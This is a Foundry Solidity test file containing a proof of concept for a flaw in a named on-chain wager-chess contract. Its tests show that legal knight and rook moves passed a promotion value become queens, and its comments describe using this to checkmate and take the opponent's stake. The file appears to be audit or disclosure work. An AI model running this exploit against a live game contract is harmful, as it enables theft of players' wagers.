// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ChessLogic} from "../src/ChessLogic.sol";

/// @notice Thin harness holding a ChessLogic.Game in storage so we can call the library's
/// `internal` executeMove on the REAL contract code (fenestbuc/wager-chess ChessLogic.sol).
contract ChessHarness {
    ChessLogic.Game internal game;

    function init() external {
        game = ChessLogic.newGame();
    }

    function exec(uint8 from, uint8 to, uint8 promo) external {
        ChessLogic.executeMove(game, from, to, promo);
    }

    function board(uint8 sq) external view returns (uint8) {
        return game.board[sq];
    }

    function whiteToMove() external view returns (bool) {
        return game.whiteToMove;
    }
}

/// @notice Proves the HIGH bug in fenestbuc/wager-chess ChessLogic: isValidMove only validates the
/// `promotion` argument for PAWNS (pt==1); for every other piece it is ignored, yet executeMove
/// applies it unconditionally (`board[to] = promotion != NONE ? promoted : piece`). So ANY legal
/// non-pawn move carrying promotion=5 turns the moved piece into a QUEEN -> spawn a winning army ->
/// checkmate -> steal the opponent's wager. Squares: a1=0, b1=1 ... (file + rank*8). WN=2, WQ=5.
contract FreePromotionPoC is Test {
    ChessHarness h;

    function setUp() public {
        h = new ChessHarness();
        h.init();
    }

    function test_KnightMove_IllegallyBecomesQueen() public {
        // b1 (square 1) holds a white knight (WN = 2) at the start.
        assertEq(h.board(1), 2, "b1 starts as a white knight");

        // White plays a LEGAL knight move b1 -> c3 (square 18) but passes promotion = 5 (Queen).
        // isValidMove accepts it (promotion is ignored for non-pawns); executeMove then places a Queen.
        h.exec(1, 18, 5);

        assertEq(h.board(18), 5, "the knight was ILLEGALLY promoted to a WHITE QUEEN on c3");
        assertEq(h.board(1), 0, "b1 is now empty");
    }

    function test_Control_KnightMoveWithoutPromotion_StaysKnight() public {
        // Same move without the promotion arg -> the piece stays a knight (engine works normally).
        h.exec(1, 18, 0); // NONE
        assertEq(h.board(18), 2, "without promotion the knight stays a knight");
    }

    function test_RookMove_AlsoBecomesQueen() public {
        // Open a file for the rook: move pawn a2(8)->a4(24), black replies, then rook a1(0)->a3(16)+Q.
        h.exec(8, 24, 0);   // white pawn a2->a4 (legal, no promotion)
        h.exec(52, 44, 0);  // black pawn e7->e6 (a legal black reply so it's white's turn again)
        // White rook a1 -> a3 with promotion = 5 -> Queen.
        assertEq(h.board(0), 4, "a1 starts as a white rook (WR=4)");
        h.exec(0, 16, 5);
        assertEq(h.board(16), 5, "the rook was ILLEGALLY promoted to a WHITE QUEEN on a3");
    }
}
